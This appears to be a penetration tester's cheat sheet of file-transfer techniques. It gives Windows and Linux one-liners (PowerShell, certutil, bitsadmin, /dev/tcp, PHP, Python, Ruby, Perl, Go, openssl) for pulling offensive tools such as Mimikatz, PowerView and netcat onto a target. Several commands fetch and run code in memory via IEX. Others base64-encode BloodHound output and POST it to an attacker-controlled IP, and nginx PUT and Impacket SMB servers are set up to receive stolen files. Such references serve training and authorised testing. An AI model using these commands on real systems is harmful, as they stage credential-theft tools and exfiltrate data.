| **Command** | **Description** |
| --------------|-------------------|
| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1` | Download a file with PowerShell |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`  | Execute a file in memory using PowerShell |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64` | Upload a file with PowerShell |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe` | Download a file using Bitsadmin |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe` | Download a file using Certutil |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | Download a file using Wget |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | Download a file using cURL |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'` | Download a file using PHP |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file using SCP |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |
|
|``` Linux ```
| `OPPESLL Transfer File `
| `openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem` | Create certificate
| `openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh` | Stand up server
| `openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh` | Download file
| 
| `Bash (/dev/tcp)`
| `exec 3<>/dev/tcp/10.10.10.32/80` | Connect to Target's Webserver
| `echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3` | HTTP GET Request
| `cat <&3` | Print the Response
|
| `php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'` | Fopen()
| `php -r '$rfile = "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"; $lfile = "LinEnum.sh"; $fp = fopen($lfile, "w+"); $ch = curl_init($rfile); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_TIMEOUT, 20); curl_exec($ch);'` | Php-curl
|
| `import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")` | python2
| `import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")` | python3
|
| `ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'` | ruby
| `perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'` | perl
|
|Go
|```
package main
import (
	 "os"
     "io"
     "net/http"
)

func main() {
     lfile, err := os.Create("LinEnum.sh")
     _ = err
     defer lfile.Close()

     rfile := "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
     response, err := http.Get(rfile)
     defer response.Body.Close()

     io.Copy(lfile, response.Body)
}```


| `Windows`
|
| `(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1',"C:\Users\Public\Downloads\PowerView.ps1")` | PowerShell Downloads
| `Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1`
| `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')`
| `Invoke-WebRequest https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 | iex`
| `Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | iex;`
| `Import-Module bitstransfer;Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"`
| `Upload File Poweshell`
| ```$b64 = [System.convert]::ToBase64String((Get-Content -Path 'c:/users/public/downloads/BloodHound.zip' -Encoding Byte))` 
|    Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64 ```
| `Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql`
|
| ```Catching Files over HTTP/SMB ```
| `Nginx Enable PUT`
| 1 - `sudo mkdir -p /var/www/uploads/SecretUploadDirectory`
| 2 - ` sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory`
| 3 - ```Create the NGINX Configuration file, by creating the file /etc/nginx/sites-available/upload.conf with the contents:```
```server {
	listen 9001;
	
	location /SecretUploadDirectory/ {
		root	/var/www/uploads;
		dav_methods	PUT;
	}
}
```
| 4-`Symlink our site to the sites-enabled directory.: sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/`
| 5 - `Start nginx : sudo systemctl restart nginx.service`
| 6 - `tail -2 /var/log/nginx/error.log`
| 7 - `sudo rm /etc/nginx/sites-enabled/default`
|
| ```Impacket SMBServer - Syntax```
| `smbserver.py -smb2support <share name> <location>`
| example : ```mkdir Transfers && cd Transfers
|             r00Tve0m@root[root]$ /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support FileTransfer $(pwd)```
|
|              ```smbserver.py -user USERNAME -password PASSWORD FileTransfer $(pwd)```
| 
